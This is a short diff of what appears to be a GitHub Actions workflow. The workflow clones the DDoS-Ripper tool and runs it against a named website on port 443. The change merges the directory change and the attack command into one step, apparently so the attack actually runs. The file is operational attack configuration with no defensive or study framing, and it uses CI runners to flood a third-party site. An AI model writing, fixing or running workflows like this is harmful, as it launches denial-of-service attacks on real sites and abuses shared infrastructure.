@@ -11,6 +11,4 @@ jobs:
     - name: Download
       run: git clone https://github.com/palahsu/DDoS-Ripper
     - name: cd
-      run: cd DDoS-Ripper
-    - name: ddos
-      run: python3 DRipper.py -s lahelu.com -t 443
+      run: cd DDoS-Ripper && python3 DRipper.py -s lahelu.com -t 443
